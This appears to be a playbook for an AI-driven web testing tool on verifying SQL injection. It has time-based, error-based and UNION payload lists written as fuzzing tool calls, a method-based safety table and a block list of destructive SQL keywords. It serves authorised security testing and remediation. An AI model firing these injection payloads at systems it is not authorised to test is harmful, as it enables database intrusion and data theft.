# Verify SQL Injection (time-based / error-based / UNION)

Verify SQL injection on a recorded HTTP flow. Defaults to time-based blind SQLi because it is safe on every HTTP method; only run UNION on read-only endpoints.

## Inputs

- `target_flow_id`: recorded `flow_id` of the request that reaches the suspected SQL sink. Required.
- `injection_point`: typed `fuzz_http.positions[].path` for the sink — typically `body`, `raw_query`, or `headers[N].value`. Required.
- `technique`: one of `time-based`, `error-based`, `union-orderby`, `union-select`. Optional; defaults to `time-based`.

If any required field is empty, ask the user.

## Safety guardrails

Before issuing any payload:

1. Check the HTTP method via `query`:

   ```json
   // query
   {"resource": "flow", "id": "{{target_flow_id}}"}
   ```

2. Apply the method-based safety table — do not relax it under any circumstances:

   | HTTP Method | Safe Payloads | Prohibited |
   |-------------|--------------|------------|
   | GET | All types (time / error / UNION / `OR 1=1`) | None |
   | POST (search) | time-based, error-based, UNION | Destructive SQL (`DROP`, `DELETE FROM`, ...) |
   | POST (create) | time-based, error-based | `OR 1=1`, UNION, destructive SQL |
   | PUT / PATCH / DELETE | time-based, error-based | `OR 1=1`, UNION, destructive SQL |

   When in doubt, use **time-based blind SQLi** — it is safe on every method.

3. Never send any payload containing `DROP`, `DELETE FROM`, `UPDATE`, `INSERT`, `ALTER`, `TRUNCATE`, or stacked queries (`;`).

## Plan

### Time-based blind (default)

```json
// fuzz_http
{
  "flow_id": "{{target_flow_id}}",
  "positions": [
    {
      "path": "{{injection_point}}",
      "payloads": [
        "normalvalue",
        "' OR SLEEP(3)-- ",
        "' OR SLEEP(3)#",
        "1 OR SLEEP(3)",
        "1; WAITFOR DELAY '0:0:3'--",
        "1' AND (SELECT SLEEP(3))-- ",
        "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)"
      ]
    }
  ],
  "tag": "sqli-time-based"
}
```

Evaluation: filter the fuzz result with `outliers_only: true` and check whether SLEEP payloads added roughly the expected delay versus the `normalvalue` baseline.

### Error-based (safe on side-effecting methods)

```json
// fuzz_http
{
  "flow_id": "{{target_flow_id}}",
  "positions": [
    {
      "path": "{{injection_point}}",
      "payloads": [
        "normalvalue",
        "'",
        "''",
        "'\"",
        "1'",
        "1 AND 'a'='b",
        "1' AND 'a'='b"
      ]
    }
  ],
  "tag": "sqli-error-based"
}
```

Evaluation: a single quote changing status to 5xx, or `SQL syntax` / `ORA-` / `SQLSTATE` appearing in the body, indicates SQLi.

### UNION (read-only endpoints only)

Step 1 — identify column count via `ORDER BY`:

```json
// fuzz_http
{
  "flow_id": "{{target_flow_id}}",
  "positions": [
    {
      "path": "{{injection_point}}",
      "payloads": [
        "id=1 ORDER BY 1-- ",
        "id=1 ORDER BY 2-- ",
        "id=1 ORDER BY 3-- ",
        "id=1 ORDER BY 5-- ",
        "id=1 ORDER BY 10-- ",
        "id=1 ORDER BY 20-- "
      ]
    }
  ],
  "tag": "sqli-union-orderby"
}
```

The boundary where ORDER BY N transitions from 200 to 500 is the column count.

Step 2 — UNION SELECT with the discovered column count:

```json
// fuzz_http
{
  "flow_id": "{{target_flow_id}}",
  "positions": [
    {
      "path": "{{injection_point}}",
      "payloads": [
        "id=1 UNION SELECT NULL,NULL,NULL-- ",
        "id=0 UNION SELECT NULL,NULL,NULL-- "
      ]
    }
  ],
  "tag": "sqli-union-select"
}
```

## Result analysis

```json
// query
{
  "resource": "fuzz_results",
  "fuzz_id": "<fuzz-id>",
  "sort_by": "duration_ms",
  "limit": 100,
  "fields": ["index", "payloads", "status_code", "duration_ms", "response_length"]
}
```

For outlier detection (time-based blind):

```json
// query
{
  "resource": "fuzz_results",
  "fuzz_id": "<fuzz-id>",
  "filter": {"outliers_only": true}
}
```

## Reporting

Summarise: technique used, the specific payload that triggered evidence, the baseline vs anomalous response/timing, and a remediation recommendation (parameterised queries / prepared statements at the offending sink).
